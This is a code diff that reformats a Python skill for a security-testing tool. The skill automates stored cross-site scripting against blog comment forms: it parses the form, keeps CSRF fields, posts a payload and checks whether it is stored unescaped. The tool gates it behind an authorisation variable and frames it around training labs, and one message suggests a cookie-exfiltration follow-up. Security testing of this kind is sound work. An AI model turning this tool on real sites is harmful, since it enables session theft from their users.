@@ -21,7 +21,7 @@ class _FormParser(HTMLParser):
             self._cur = {
                 "action": a.get("action", ""),
                 "method": (a.get("method") or "post").lower(),
-                "inputs": {},          # name -> value (carries hidden csrf etc.)
+                "inputs": {},  # name -> value (carries hidden csrf etc.)
                 "textarea_name": None,  # the comment box, usually a <textarea>
             }
         elif self._cur is not None and tag == "input":
@@ -71,10 +71,16 @@ def stored_xss_comment(url: str, payload: str = "", post_id: int = 0) -> dict:
         stored unescaped (vulnerable) -- or an {"error": ...} dict.
     """
     if os.environ.get("SLEUTH_ALLOW_ACTIVE_SKILLS", "").strip().lower() not in (
-        "1", "true", "yes", "on",
+        "1",
+        "true",
+        "yes",
+        "on",
     ):
-        return {"ok": False, "error": "Skill 'stored_xss_comment' is disabled. "
-                "Set SLEUTH_ALLOW_ACTIVE_SKILLS=true for authorised targets only."}
+        return {
+            "ok": False,
+            "error": "Skill 'stored_xss_comment' is disabled. "
+            "Set SLEUTH_ALLOW_ACTIVE_SKILLS=true for authorised targets only.",
+        }
 
     marker = "sleuthxss" + os.urandom(4).hex()
     if not payload:
@@ -94,8 +100,10 @@ def stored_xss_comment(url: str, payload: str = "", post_id: int = 0) -> dict:
             root = session.get(url, timeout=15)
             m = re.search(r'href="([^"]*post\?postId=\d+)"', root.text)
             if not m:
-                return {"error": "no blog post link (/post?postId=) found on the page",
-                        "hint": "pass post_id=N explicitly if the URL scheme differs"}
+                return {
+                    "error": "no blog post link (/post?postId=) found on the page",
+                    "hint": "pass post_id=N explicitly if the URL scheme differs",
+                }
             post_url = urljoin(url, html.unescape(m.group(1)))
 
         # 2. Load the post and parse its comment form.
@@ -108,15 +116,20 @@ def stored_xss_comment(url: str, payload: str = "", post_id: int = 0) -> dict:
             (n for n in form["inputs"] if n.lower() == "comment"), None
         )
         if not comment_field:
-            return {"error": "comment form has no identifiable comment field",
-                    "post_url": post_url, "fields": list(form["inputs"])}
+            return {
+                "error": "comment form has no identifiable comment field",
+                "post_url": post_url,
+                "fields": list(form["inputs"]),
+            }
 
         # 3. Build the submission: keep hidden fields (csrf, postId), fill the rest.
         data = dict(form["inputs"])
         data[comment_field] = payload
-        for field, value in (("name", "sleuth"),
-                             ("email", "sleuth@example.com"),
-                             ("website", f"https://example.com/{marker}")):
+        for field, value in (
+            ("name", "sleuth"),
+            ("email", "sleuth@example.com"),
+            ("website", f"https://example.com/{marker}"),
+        ):
             if field in data:
                 data[field] = value
 
@@ -147,8 +160,8 @@ def stored_xss_comment(url: str, payload: str = "", post_id: int = 0) -> dict:
             "STORED XSS CONFIRMED: the payload is stored unescaped and will "
             "execute when the post is viewed. Swap in a cookie-exfil payload "
             "pointing at your exploit server to complete the lab."
-            if stored_unescaped else
-            "Payload not found unescaped. The field may be escaped/sanitised, the "
+            if stored_unescaped
+            else "Payload not found unescaped. The field may be escaped/sanitised, the "
             "comment may await moderation, or the injection point differs. Try a "
             "custom payload or the 'website' field."
         ),
